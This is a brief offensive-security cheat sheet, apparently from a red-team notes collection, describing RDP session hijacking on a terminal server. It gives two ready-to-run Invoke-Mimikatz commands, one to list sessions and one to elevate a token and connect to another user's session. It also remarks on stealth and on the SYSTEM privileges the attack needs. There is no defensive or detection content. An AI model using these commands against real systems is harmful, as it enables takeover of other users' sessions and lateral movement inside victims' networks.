# RDP Hijacking

This method is not stealthy and will disconnect a users active terminal service session. However, you will also be able to connect to a disconnected session which could be stealthier.

This method also requires privileges as SYSTEM on the terminal server host.

### 1) Mimikatz

    Invoke-Mimikatz -Command '"ts::sessions"'

### 2) Connect to the terminal services session

    Invoke-Mimikatz -Command '"token::elevate" "ts::remote /id:SESSION_ID"'
